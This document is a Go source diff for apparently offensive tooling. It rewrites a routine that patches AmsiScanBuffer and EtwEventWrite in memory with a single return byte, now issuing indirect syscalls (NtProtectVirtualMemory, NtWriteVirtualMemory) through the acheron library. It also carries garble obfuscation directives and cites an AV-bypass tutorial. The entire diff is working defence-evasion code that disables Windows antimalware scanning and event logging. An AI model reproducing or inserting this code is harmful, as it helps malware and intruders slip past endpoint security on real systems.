@@ -5,90 +5,118 @@ import (
 	"syscall"
 	"unsafe"
 
+	"github.com/f1zm0/acheron"
 	"golang.org/x/sys/windows"
 )
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
-func PatchLocal(address uintptr, patch []byte) error {
-	// Add write permissions
-	var oldprotect uint32
-	err := windows.VirtualProtect(address, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldprotect)
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+func PatchLocalIndirect(ach *acheron.Acheron, address uintptr, patch []byte) error {
+	length := uintptr(len(patch))
+	var oldProtect uint32
+
+	// change to RWX
+	_, err := ach.Syscall(
+		ach.HashString("NtProtectVirtualMemory"),
+		uintptr(windows.CurrentProcess()),
+		uintptr(unsafe.Pointer(&address)),
+		uintptr(unsafe.Pointer(&length)),
+		windows.PAGE_EXECUTE_READWRITE,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
 	if err != nil {
-		return fmt.Errorf("[-] Failed to change memory permissions for 0x%x: %v", address, err)
+		return fmt.Errorf("[-] NtProtectVirtualMemory failed: %v", err)
 	}
-	modntdll := syscall.NewLazyDLL("Ntdll.dll")
-	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")
 
-	// Write Patch
-	procrtlMoveMemory.Call(address, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))
-	fmt.Printf("[+] Wrote patch at destination address 0x%x\n", address)
-
-	// Restore memory permissions
-	err = windows.VirtualProtect(address, uintptr(len(patch)), oldprotect, &oldprotect)
+	// write bytes for patch
+	_, err = ach.Syscall(
+		ach.HashString("NtWriteVirtualMemory"),
+		uintptr(windows.CurrentProcess()),
+		address,
+		uintptr(unsafe.Pointer(&patch[0])),
+		uintptr(len(patch)),
+		0,
+	)
 	if err != nil {
-		return fmt.Errorf("[-] Failed to change memory permissions for 0x%x: %v", address, err)
-	}
-	// Verify Patch
-	verified := verifyPatch(address, patch)
-	if !verified {
-		return fmt.Errorf("[-] Verification failed for patch at address 0x%x", address)
+		return fmt.Errorf("[-] NtWriteVirtualMemory failed: %v", err)
 	}
 
+	// Restore old permission
+	_, err = ach.Syscall(
+		ach.HashString("NtProtectVirtualMemory"),
+		uintptr(windows.CurrentProcess()),
+		uintptr(unsafe.Pointer(&address)),
+		uintptr(unsafe.Pointer(&length)),
+		uintptr(oldProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if err != nil {
+		return fmt.Errorf("[-] NtProtectVirtualMemory restore failed: %v", err)
+	}
+	if !verifyPatch(address, patch) {
+		return fmt.Errorf("[-] Patch verification failed at address 0x%x", address)
+	}
+
+	fmt.Printf("[+] Patch applied and verified at address 0x%x\n", address)
 	return nil
 }
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
 func verifyPatch(address uintptr, patch []byte) bool {
 	for i := 0; i < len(patch); i++ {
-		if *(*byte)(unsafe.Pointer(address + uintptr(i))) != patch[i] {
-			fmt.Errorf("[-] Byte mismatch at address 0x%x: expected 0x%x, got 0x%x", address+uintptr(i), patch[i], *(*byte)(unsafe.Pointer(address + uintptr(i))))
+		actual := *(*byte)(unsafe.Pointer(address + uintptr(i)))
+		if actual != patch[i] {
+			fmt.Printf("[-] Byte mismatch at 0x%x: expected 0x%x, got 0x%x\n", address+uintptr(i), patch[i], actual)
 			return false
 		}
 	}
-	fmt.Printf("[+] Patch verified at address 0x%x", address)
 	return true
 }
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
-func patchAmsiLocal() error {
-	fmt.Println("[*] Patching AmsiScanBuffer -- Local Process")
-	amsidll, _ := syscall.LoadLibrary("amsi.dll")
-	procAmsiScanBuffer, _ := syscall.GetProcAddress(amsidll, "AmsiScanBuffer")
-
-	patch := []byte{0xc3}
-	err := PatchLocal(procAmsiScanBuffer, patch)
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+func patchAmsiIndirect(ach *acheron.Acheron) error {
+	fmt.Println("[*] Patching AmsiScanBuffer with indirect syscalls...")
+	amsi, err := syscall.LoadLibrary("amsi.dll")
 	if err != nil {
+		return fmt.Errorf("[-] Failed to load amsi.dll: %v", err)
+	}
+	addr, err := syscall.GetProcAddress(amsi, "AmsiScanBuffer")
+	if err != nil {
+		return fmt.Errorf("[-] Failed to get AmsiScanBuffer address: %v", err)
+	}
+	return PatchLocalIndirect(ach, addr, []byte{0xC3})
+}
+
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+func patchEtwIndirect(ach *acheron.Acheron) error {
+	fmt.Println("[*] Patching EtwEventWrite with indirect syscalls...")
+	ntdll, err := syscall.LoadLibrary("ntdll.dll")
+	if err != nil {
+		return fmt.Errorf("[-] Failed to load ntdll.dll: %v", err)
+	}
+	addr, err := syscall.GetProcAddress(ntdll, "EtwEventWrite")
+	if err != nil {
+		return fmt.Errorf("[-] Failed to get EtwEventWrite address: %v", err)
+	}
+	return PatchLocalIndirect(ach, addr, []byte{0xC3})
+}
+
+//.garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
+func ExecuteAllPatchesIndirect() error {
+	ach, err := acheron.New()
+	if err != nil {
+		return fmt.Errorf("[-] Failed to initialize Acheron: %v", err)
+	}
+
+	if err := patchAmsiIndirect(ach); err != nil {
 		return err
 	}
-	fmt.Println("[+] Patched AmsiScanBuffer -- Local Process")
+
+	if err := patchEtwIndirect(ach); err != nil {
+		return err
+	}
+
+	fmt.Println("[+] All patches applied using indirect syscalls")
 	return nil
 }
 
-//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
-func patchEtwLocal() error {
-	fmt.Println("[*] Patching EtwEventWrite -- Local Process")
-	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
-	procEtwEventWrite, _ := syscall.GetProcAddress(ntdll, "EtwEventWrite")
-	patch := []byte{0xC3}
-	err := PatchLocal(procEtwEventWrite, patch)
-	if err != nil {
-		return err
-	}
-	fmt.Println("[+] Patched EtwEventWrite -- Local Process")
-	return nil
-}
-
-func ExecuteAllPatches() error {
-	err := patchAmsiLocal()
-	if err != nil {
-		return err
-	}
-	err = patchEtwLocal()
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
-//light modification from this code https://www.scriptchildie.com/evasion/av-bypass/5.-amsi-bypass
-//TODO: Need to implement indirect syscalls to get rid of ntdll unhooking
+//light modification from this code https://www.scriptchildie.com/evasion/av-bypass/5.-amsi-bypass and add indirect syscalls
